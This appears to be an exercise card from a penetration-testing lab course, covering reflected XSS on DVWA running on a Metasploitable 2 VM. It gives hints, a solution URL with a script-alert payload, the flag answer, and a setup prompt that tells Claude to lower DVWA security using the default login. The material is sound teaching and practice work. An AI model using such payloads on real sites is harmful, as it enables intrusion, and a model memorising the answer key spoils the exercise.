# Q069 — DVWA Reflected XSS

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` (Metasploitable 2) |
| **Domain** | 12 — Web Apps / 13 — SQLi |
| **Difficulty** | 🟡 Medium |
| **Tools** | `curl (or browser)` |
| **Time budget** | 15–25 min |

---

## 📝 Question

Trigger reflected XSS on DVWA `vulnerabilities/xss_r/`. Provide the payload that pops `alert(1)`.

---

## 🎯 Flag Format

```
payload=<html>
```

Example: `payload=<script>alert(1)</script>`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

Low security has zero filtering.
</details>

<details>
<summary>Hint 2</summary>

Submit via name field.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
# http://192.168.52.129/dvwa/vulnerabilities/xss_r/?name=<script>alert(1)</script>
```

JavaScript alert pops in browser.

**Answer:** `payload=<script>alert(1)</script>`

📖 Ref: [playbooks/webapp-playbook.md](../../playbooks/webapp-playbook.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
Pre-requisites for Q069:
1. Verify Metasploitable2 (192.168.52.129) up; DVWA reachable.
2. DVWA security=low set (admin/password then DVWA Security → Low).
3. Browser required to see alert() fire — use Firefox on Parrot.

Report back: "Lab ready for Q069 — DVWA reachable, security=low".
```
